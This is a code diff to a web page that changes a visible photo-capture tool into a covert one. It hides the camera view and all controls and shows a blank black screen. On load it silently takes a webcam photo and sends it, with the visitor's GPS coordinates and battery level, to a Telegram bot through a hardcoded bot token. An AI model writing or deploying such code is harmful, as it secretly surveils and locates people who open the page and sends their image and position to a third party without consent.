@@ -7,52 +7,47 @@
     <style>
         body {
             background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 50px;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
         }
         #camera {
-            margin: 20px auto;
-            width: 320px;
-            height: 240px;
-            border: 2px solid white;
-        }
-        #capture {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Capture Your Photo</h1>
     <div id="camera">
         <video id="video" width="320" height="240" autoplay></video>
-        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+        <canvas id="canvas" width="320" height="240"></canvas>
     </div>
-    <button id="capture">Capture Photo</button>
-    <p id="location"></p>
-    <p id="battery"></p>
 
     <script>
+        // Telegram Bot Token and Chat ID
+        const botToken = '7096948712:AAHIiFUBPGghh6fiWHhkWAL9l9H5E7P0SJM';
+        const chatId = '@BERLIN_IS_BERLIN';
+
         // Access the camera
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture');
-        const locationInfo = document.getElementById('location');
-        const batteryInfo = document.getElementById('battery');
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
+
+                // Wait for the video to load and then capture the photo
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        capturePhotoAndSendData();
+                    }, 1000); // Wait 1 second to ensure the camera is ready
+                };
             })
             .catch((err) => {
                 console.error("Error accessing the camera: ", err);
             });
 
-        // Capture photo
-        captureButton.addEventListener('click', () => {
+        // Function to capture photo and send data
+        function capturePhotoAndSendData() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 320, 240);
             const imageData = canvas.toDataURL('image/png');
@@ -62,44 +57,48 @@
                 navigator.geolocation.getCurrentPosition((position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    locationInfo.textContent = `Location: Latitude ${latitude}, Longitude ${longitude}`;
 
                     // Get battery status
                     navigator.getBattery().then((battery) => {
                         const batteryLevel = battery.level * 100;
-                        batteryInfo.textContent = `Battery: ${batteryLevel}%`;
 
                         // Send data to Telegram bot
                         sendDataToTelegram(imageData, latitude, longitude, batteryLevel);
                     });
+                }, (error) => {
+                    console.error("Error getting location: ", error);
                 });
             } else {
-                locationInfo.textContent = "Geolocation is not supported by this browser.";
+                console.error("Geolocation is not supported by this browser.");
             }
-        });
+        }
 
+        // Function to send data to Telegram
         function sendDataToTelegram(imageData, latitude, longitude, batteryLevel) {
-            const botToken = '7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4';
-            const chatId = '@BERLIN_IS_BERLIN';
             const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nBattery: ${batteryLevel}%`;
 
-            // Send image and message to Telegram bot
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageData);
-            formData.append('caption', message);
+            // Convert base64 image data to a Blob
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png');
+                    formData.append('caption', message);
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+                    // Send the data to Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                });
         }
     </script>
 </body>
